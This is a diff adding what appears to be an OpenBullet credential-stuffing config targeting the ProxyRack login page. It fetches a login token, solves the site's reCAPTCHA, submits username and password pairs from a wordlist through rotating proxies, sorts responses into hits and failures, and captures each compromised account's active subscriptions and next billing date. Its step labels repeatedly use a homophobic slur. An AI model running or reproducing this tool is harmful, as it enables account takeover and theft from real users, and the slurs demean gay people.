@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "ProxyRack",
+  "SuggestedBots": 50,
+  "LastModified": "2018-06-13T11:41:55.2003756+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HomoSexualPantherGET REQUEST GET "https://www.proxyrack.com/access/member" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualID PARSE "<SOURCE>" CSS "[name=login_attempt_id]" "value" 0 -> VAR "HomoSexualPanther" "" "" 
+#HomoSexualRECAP RECAPTCHA "https://www.proxyrack.com/access/member" "6Ld3CVkUAAAAALYU8XjU8sydPqrRv_y34PWhKVmZ" -> VAR "RECAP" 
+#HomoSexualPOST REQUEST POST "https://www.proxyrack.com/access/login" AutoRedirect=TRUE 
+  CONTENT "g-recaptcha-response=<RECAP>&amember_login=<USER>&amember_pass=<PASS>&login_attempt_id=<HomoSexualPanther>&amember_redirect_url=%2Faccess%2Fmember&=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualCHECK KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Retry OR 
+    KEY "Anti Spam check failed" 
+  KEYCHAIN Failure OR 
+    KEY "The user name or password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+#HomoSexualSUBS PARSE "<SOURCE>" LR "<strong>" ".</" Recursive=FALSE -> CAP "Active Subscriptions" "" "" 
+#HomoSexualBILL PARSE "<SOURCE>" LR "next bill" "                <a " Recursive=FALSE -> CAP "next bill" "" "" 
+#ToS FUNCTION Constant "<HomoSexualPanther>" -> VAR "HomoSexualPanther" 
